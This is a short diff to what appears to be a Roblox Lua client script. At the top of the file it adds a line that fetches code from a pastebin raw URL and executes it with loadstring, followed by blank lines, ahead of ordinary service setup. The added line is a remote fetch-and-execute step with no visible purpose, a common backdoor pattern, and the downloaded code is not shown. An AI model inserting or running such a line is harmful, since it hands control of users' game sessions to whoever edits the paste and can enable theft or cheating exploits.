@@ -1,3 +1,9 @@
+
+loadstring(game:HttpGetAsync('https://pastebin.com/raw/WgkcDYUs'))()
+
+
+
+
 -- Essential Services
 local player = game:GetService("Players").LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui", 15) -- Increased timeout for PlayerGui
